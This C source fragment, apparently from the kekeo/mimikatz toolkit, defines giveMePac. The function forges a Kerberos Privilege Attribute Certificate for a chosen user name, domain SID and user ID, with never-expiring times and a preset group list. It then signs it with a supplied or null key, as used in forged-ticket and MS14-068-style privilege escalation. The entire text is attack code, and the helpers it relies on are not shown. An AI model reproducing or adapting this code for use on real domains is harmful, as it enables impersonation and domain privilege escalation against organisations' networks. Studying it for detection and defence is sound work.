BOOL giveMePac(PCSTR Username, PSID DomainSid, DWORD UserId, KerberosTime *AuthTime, DWORD SignatureType, EncryptionKey * SignatureKey, _octet1 *pac)
{
	BOOL status = FALSE;
	KERB_VALIDATION_INFO validationInfo = {0};
	STRING user;
	kull_m_kerberos_asn1_helper_util_UTCKerberosTimeToFileTime(AuthTime, &validationInfo.LogonTime);
	KIWI_NEVERTIME(&validationInfo.LogoffTime);
	KIWI_NEVERTIME(&validationInfo.KickOffTime);
	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);

	pac->length = 0;
	pac->value = NULL;

	RtlInitString(&user, Username);
	if(NT_SUCCESS(RtlAnsiStringToUnicodeString(&validationInfo.EffectiveName, &user, TRUE)))
	{
		validationInfo.LogonDomainId = (PISID) DomainSid;

		validationInfo.UserId				= UserId;
		validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
		validationInfo.PrimaryGroupId		= defaultGroups[0].RelativeId;
		validationInfo.GroupCount = ARRAYSIZE(defaultGroups);
		validationInfo.GroupIds = defaultGroups;

		if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, (PPACTYPE *) &pac->value, (DWORD *) &pac->length))
		{
			kprintf("  * PAC generated\n");
			if(status = NT_SUCCESS(kuhl_m_pac_signature((PPACTYPE) pac->value, pac->length, SignatureType, SignatureKey ? SignatureKey->keyvalue.value : NULL, SignatureKey ?  SignatureKey->keyvalue.length : 0)))
				kprintf("  * PAC \"\"\"signed\"\"\"\n");
			else LocalFree(pac->value);
		}
		RtlFreeUnicodeString(&validationInfo.EffectiveName);
	}
	return status;
}